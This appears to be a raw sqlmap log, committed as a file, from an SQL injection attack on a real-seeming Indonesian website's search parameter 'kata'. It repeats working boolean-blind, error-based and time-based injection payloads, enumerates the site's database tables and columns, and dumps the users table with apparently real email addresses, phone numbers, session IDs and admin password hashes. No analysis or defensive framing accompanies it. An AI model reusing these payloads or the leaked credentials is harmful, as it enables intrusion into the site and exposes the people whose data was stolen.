@@ -1,0 +1,3112 @@
+sqlmap identified the following injection point(s) with a total of 953 HTTP(s) requests:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] d4t4_arpusd4
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] d4t4_arpusd4
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+[28 tables]
++---------------+
+| agenda        |
+| background    |
+| berita        |
+| gallery       |
+| halamanstatis |
+| header        |
+| hubungi       |
+| identitas     |
+| iklanatas     |
+| iklantengah   |
+| katajelek     |
+| kategori      |
+| komentar      |
+| komentarvid   |
+| logo          |
+| mod_alamat    |
+| mod_ym        |
+| modul         |
+| pasangiklan   |
+| playlist      |
+| poling        |
+| sekilasinfo   |
+| statistik     |
+| tagvid        |
+| tbl_comment   |
+| templates     |
+| users         |
+| video         |
++---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+[34 tables]
++---------------+
+| agenda        |
+| album         |
+| background    |
+| banner        |
+| berita        |
+| download      |
+| gallery       |
+| halamanstatis |
+| header        |
+| hubungi       |
+| identitas     |
+| iklanatas     |
+| iklantengah   |
+| katajelek     |
+| kategori      |
+| komentar      |
+| komentarvid   |
+| logo          |
+| menu          |
+| mod_alamat    |
+| mod_ym        |
+| modul         |
+| pasangiklan   |
+| playlist      |
+| poling        |
+| sekilasinfo   |
+| statistik     |
+| tag           |
+| tagvid        |
+| tbl_comment   |
+| templates     |
+| users         |
+| users_modul   |
+| video         |
++---------------+
+
+Database: d4t4_arpusd4
+Table: background
+[2 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| gambar        | varchar(255) |
+| id_background | int(5)       |
++---------------+--------------+
+
+Database: d4t4_arpusd4
+Table: sekilasinfo
+[5 columns]
++-------------+---------------+
+| Column      | Type          |
++-------------+---------------+
+| aktif       | enum('Y','N') |
+| gambar      | varchar(100)  |
+| id_sekilas  | int(5)        |
+| info        | varchar(100)  |
+| tgl_posting | date          |
++-------------+---------------+
+
+Database: d4t4_arpusd4
+Table: logo
+[2 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| gambar  | varchar(100) |
+| id_logo | int(5)       |
++---------+--------------+
+
+Database: d4t4_arpusd4
+Table: mod_alamat
+[2 columns]
++-----------+--------+
+| Column    | Type   |
++-----------+--------+
+| alamat    | text   |
+| id_alamat | int(5) |
++-----------+--------+
+
+Database: d4t4_arpusd4
+Table: header
+[4 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| url         | varchar(100) |
+| gambar      | varchar(100) |
+| id_header   | int(5)       |
+| tgl_posting | date         |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: identitas
+[3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| url      |
+| email    |
+| rekening | varchar(100) |
++----------+--------------+
+
+Database: d4t4_arpusd4
+Table: berita
+[1 column]
++--------+
+| Column |
++--------+
+| judul  |
++--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+[34 tables]
++---------------+
+| agenda        |
+| album         |
+| background    |
+| banner        |
+| berita        |
+| download      |
+| gallery       |
+| halamanstatis |
+| header        |
+| hubungi       |
+| identitas     |
+| iklanatas     |
+| iklantengah   |
+| katajelek     |
+| kategori      |
+| komentar      |
+| komentarvid   |
+| logo          |
+| menu          |
+| mod_alamat    |
+| mod_ym        |
+| modul         |
+| pasangiklan   |
+| playlist      |
+| poling        |
+| sekilasinfo   |
+| statistik     |
+| tag           |
+| tagvid        |
+| tbl_comment   |
+| templates     |
+| users         |
+| users_modul   |
+| video         |
++---------------+
+
+Database: d4t4_arpusd4
+Table: users
+[9 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| level        | varchar(20)   |
+| blokir       | enum('Y','N') |
+| email        | varchar(100)  |
+| foto         | varchar(100)  |
+| id_session   | varchar(255)  |
+| nama_lengkap | varchar(100)  |
+| no_telp      | varchar(20)   |
+| password     | varchar(255)  |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: templates
+[6 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| aktif        | enum('Y','N') |
+| folder       | varchar(50)   |
+| id_templates | int(5)        |
+| judul        | varchar(100)  |
+| pembuat      | varchar(50)   |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: mod_ym
+[3 columns]
++---------+
+| Column  |
++---------+
+| id      | int(11)      |
+| nama    | varchar(255) |
+| ym_icon |
++---------+
+
+Database: d4t4_arpusd4
+Table: modul
+[4 columns]
++--------+
+| Column |
++--------+
+| status |
+| aktif  |
+| gambar |
+| urutan |
++--------+
+
+Database: d4t4_arpusd4
+Table: header
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| url         | varchar(100) |
+| gambar      | varchar(100) |
+| id_header   | int(5)       |
+| judul       | varchar(100) |
+| tgl_posting | date         |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: gallery
+[2 columns]
++-------------+
+| Column      |
++-------------+
+| gallery_seo |
+| jdl_gallery |
++-------------+
+
+Database: d4t4_arpusd4
+Table: background
+[2 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| gambar        | varchar(255) |
+| id_background | int(5)       |
++---------------+--------------+
+
+Database: d4t4_arpusd4
+Table: logo
+[2 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| gambar  | varchar(100) |
+| id_logo | int(5)       |
++---------+--------------+
+
+Database: d4t4_arpusd4
+Table: identitas
+[5 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| url            |
+| email          |
+| id_identitas   | int(5)       |
+| meta_deskripsi | varchar(250) |
+| rekening       | varchar(100) |
++----------------+--------------+
+
+Database: d4t4_arpusd4
+Table: statistik
+[0 columns]
++--------+
+| Column |
++--------+
++--------+
+
+Database: d4t4_arpusd4
+Table: mod_alamat
+[2 columns]
++-----------+--------+
+| Column    | Type   |
++-----------+--------+
+| alamat    | text   |
+| id_alamat | int(5) |
++-----------+--------+
+
+Database: d4t4_arpusd4
+Table: berita
+[4 columns]
++-----------+
+| Column    |
++-----------+
+| judul     |
+| judul_seo | text |
+| utama     |
+| youtube   |
++-----------+
+
+Database: d4t4_arpusd4
+Table: sekilasinfo
+[5 columns]
++-------------+---------------+
+| Column      | Type          |
++-------------+---------------+
+| aktif       | enum('Y','N') |
+| gambar      | varchar(100)  |
+| id_sekilas  | int(5)        |
+| info        | varchar(100)  |
+| tgl_posting | date          |
++-------------+---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+Table: users
+[2 entries]
++-------------------------------------------------+-------------------------------------------------------------------------------------------+-------------------------+--------+---------+-------------+----------------------------------------------------------------------------------------------------------------------------------+----------+---------------+
+| id_session                                      | foto                                                                                      | email                   | blokir | level   | no_telp     | password                                                                                                                         | username | nama_lengkap  |
++-------------------------------------------------+-------------------------------------------------------------------------------------------+-------------------------+--------+---------+-------------+----------------------------------------------------------------------------------------------------------------------------------+----------+---------------+
+| 23f5e1973b5a048ffaaa0bd0183b5f87-20250203085121 | <blank>                                                                                   | bastiyararpus@gmail.com | N      | user    | 0246921128  | af0abce6b145245cb892cbece27a67ccb29e963264ca290d1dd6fdd1ca61ffdac45e2979a178405fea17afe91d5e0024834c84adeb901e792f5165fd4acf8d4f | kreator  | kreator       |
+| q173s8hs1jl04st35169ccl8o7                      | kisspng-web-development-web-design-logo-website-5abbea0acaa518_0043648215222645868301.jpg | ungaranarpus@gmail.com  | N      | admin   | 82223044548 | 2c581ff86e8c6f782e6bf752b590311b372c17d5e421e02218cf6057f9c8fb340536dbe03f986ab267e797b18afc56f3dc60184017996df4f81975a992cff109 | admin    | ADMIN ARPUSDA |
++-------------------------------------------------+-------------------------------------------------------------------------------------------+-------------------------+--------+---------+-------------+----------------------------------------------------------------------------------------------------------------------------------+----------+---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+Table: users
+[2 entries]
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+| username | password                                                                                                                         |
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+| admin    | 2c581ff86e8c6f782e6bf752b590311b372c17d5e421e02218cf6057f9c8fb340536dbe03f986ab267e797b18afc56f3dc60184017996df4f81975a992cff109 |
+| kreator  | af0abce6b145245cb892cbece27a67ccb29e963264ca290d1dd6fdd1ca61ffdac45e2979a178405fea17afe91d5e0024834c84adeb901e792f5165fd4acf8d4f |
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] d4t4_arpusd4
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+[34 tables]
++---------------+
+| agenda        |
+| album         |
+| background    |
+| banner        |
+| berita        |
+| download      |
+| gallery       |
+| halamanstatis |
+| header        |
+| hubungi       |
+| identitas     |
+| iklanatas     |
+| iklantengah   |
+| katajelek     |
+| kategori      |
+| komentar      |
+| komentarvid   |
+| logo          |
+| menu          |
+| mod_alamat    |
+| mod_ym        |
+| modul         |
+| pasangiklan   |
+| playlist      |
+| poling        |
+| sekilasinfo   |
+| statistik     |
+| tag           |
+| tagvid        |
+| tbl_comment   |
+| templates     |
+| users         |
+| users_modul   |
+| video         |
++---------------+
+
+Database: d4t4_arpusd4
+Table: video
+[14 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| dilihat     | int(7)       |
+| gbr_video   | varchar(100) |
+| hari        | varchar(20)  |
+| id_playlist | int(5)       |
+| id_video    | int(5)       |
+| jam         | time         |
+| jdl_video   | varchar(100) |
+| keterangan  | text         |
+| tagvid      | varchar(100) |
+| tanggal     | date         |
+| username    | varchar(30)  |
+| video       | varchar(100) |
+| video_seo   | varchar(100) |
+| youtube     | varchar(100) |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: komentarvid
+[8 columns]
++---------------+---------------+
+| Column        | Type          |
++---------------+---------------+
+| url           | varchar(100)  |
+| aktif         | enum('Y','N') |
+| id_komentar   | int(5)        |
+| id_video      | int(5)        |
+| isi_komentar  | text          |
+| jam_komentar  | time          |
+| nama_komentar | varchar(100)  |
+| tgl           | date          |
++---------------+---------------+
+
+Database: d4t4_arpusd4
+Table: statistik
+[4 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| hits    | int(10)      |
+| ip      |
+| online  | varchar(255) |
+| tanggal | date         |
++---------+--------------+
+
+Database: d4t4_arpusd4
+Table: agenda
+[2 columns]
++------------+
+| Column     |
++------------+
+| isi_agenda |
+| tgl_mulai  |
++------------+
+
+Database: d4t4_arpusd4
+Table: sekilasinfo
+[5 columns]
++-------------+---------------+
+| Column      | Type          |
++-------------+---------------+
+| aktif       | enum('Y','N') |
+| gambar      | varchar(100)  |
+| id_sekilas  | int(5)        |
+| info        | varchar(100)  |
+| tgl_posting | date          |
++-------------+---------------+
+
+Database: d4t4_arpusd4
+Table: users
+[9 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| level        | varchar(20)   |
+| blokir       | enum('Y','N') |
+| email        | varchar(100)  |
+| foto         | varchar(100)  |
+| id_session   | varchar(255)  |
+| nama_lengkap | varchar(100)  |
+| no_telp      | varchar(20)   |
+| password     | varchar(255)  |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: identitas
+[7 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| url            |
+| email          |
+| id_identitas   | int(5)       |
+| maps           | text         |
+| meta_deskripsi | varchar(250) |
+| nama_website   | varchar(100) |
+| rekening       | varchar(100) |
++----------------+--------------+
+
+Database: d4t4_arpusd4
+Table: berita
+[6 columns]
++-------------------+
+| Column            |
++-------------------+
+| gambar            |
+| judul             |
+| judul_seo         | text |
+| keterangan_gambar |
+| utama             |
+| youtube           |
++-------------------+
+
+Database: d4t4_arpusd4
+Table: mod_ym
+[3 columns]
++---------+
+| Column  |
++---------+
+| id      | int(11)      |
+| nama    | varchar(255) |
+| ym_icon |
++---------+
+
+Database: d4t4_arpusd4
+Table: header
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| url         | varchar(100) |
+| gambar      | varchar(100) |
+| id_header   | int(5)       |
+| judul       | varchar(100) |
+| tgl_posting | date         |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: mod_alamat
+[2 columns]
++-----------+--------+
+| Column    | Type   |
++-----------+--------+
+| alamat    | text   |
+| id_alamat | int(5) |
++-----------+--------+
+
+Database: d4t4_arpusd4
+Table: modul
+[4 columns]
++--------+
+| Column |
++--------+
+| status |
+| aktif  |
+| gambar |
+| urutan |
++--------+
+
+Database: d4t4_arpusd4
+Table: templates
+[6 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| aktif        | enum('Y','N') |
+| folder       | varchar(50)   |
+| id_templates | int(5)        |
+| judul        | varchar(100)  |
+| pembuat      | varchar(50)   |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: gallery
+[2 columns]
++-------------+
+| Column      |
++-------------+
+| gallery_seo |
+| jdl_gallery |
++-------------+
+
+Database: d4t4_arpusd4
+Table: background
+[2 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| gambar        | varchar(255) |
+| id_background | int(5)       |
++---------------+--------------+
+
+Database: d4t4_arpusd4
+Table: logo
+[2 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| gambar  | varchar(100) |
+| id_logo | int(5)       |
++---------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+Table: users
+[2 entries]
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+| username | password                                                                                                                         |
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+| admin    | 2c581ff86e8c6f782e6bf752b590311b372c17d5e421e02218cf6057f9c8fb340536dbe03f986ab267e797b18afc56f3dc60184017996df4f81975a992cff109 |
+| kreator  | af0abce6b145245cb892cbece27a67ccb29e963264ca290d1dd6fdd1ca61ffdac45e2979a178405fea17afe91d5e0024834c84adeb901e792f5165fd4acf8d4f |
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] d4t4_arpusd4
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+Table: users
+[2 entries]
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+| username | password                                                                                                                         |
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+| admin    | 2c581ff86e8c6f782e6bf752b590311b372c17d5e421e02218cf6057f9c8fb340536dbe03f986ab267e797b18afc56f3dc60184017996df4f81975a992cff109 |
+| kreator  | af0abce6b145245cb892cbece27a67ccb29e963264ca290d1dd6fdd1ca61ffdac45e2979a178405fea17afe91d5e0024834c84adeb901e792f5165fd4acf8d4f |
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+[34 tables]
++---------------+
+| agenda        |
+| album         |
+| background    |
+| banner        |
+| berita        |
+| download      |
+| gallery       |
+| halamanstatis |
+| header        |
+| hubungi       |
+| identitas     |
+| iklanatas     |
+| iklantengah   |
+| katajelek     |
+| kategori      |
+| komentar      |
+| komentarvid   |
+| logo          |
+| menu          |
+| mod_alamat    |
+| mod_ym        |
+| modul         |
+| pasangiklan   |
+| playlist      |
+| poling        |
+| sekilasinfo   |
+| statistik     |
+| tag           |
+| tagvid        |
+| tbl_comment   |
+| templates     |
+| users         |
+| users_modul   |
+| video         |
++---------------+
+
+Database: d4t4_arpusd4
+Table: mod_ym
+[4 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| id       | int(11)      |
+| nama     | varchar(255) |
+| username | varchar(50)  |
+| ym_icon  | int(3)       |
++----------+--------------+
+
+Database: d4t4_arpusd4
+Table: tag
+[5 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| count    | int(5)       |
+| id_tag   | int(5)       |
+| nama_tag | varchar(100) |
+| tag_seo  | varchar(100) |
+| username | varchar(50)  |
++----------+--------------+
+
+Database: d4t4_arpusd4
+Table: tbl_comment
+[7 columns]
++------------------+--------------+
+| Column           | Type         |
++------------------+--------------+
+| alamat_email     |
+| id_komentar      | int(5)       |
+| isi_pesan        | text         |
+| jam_komentar     | time         |
+| nama_lengkap     | varchar(150) |
+| reply            | int(5)       |
+| tanggal_komentar | date         |
++------------------+--------------+
+
+Database: d4t4_arpusd4
+Table: agenda
+[11 columns]
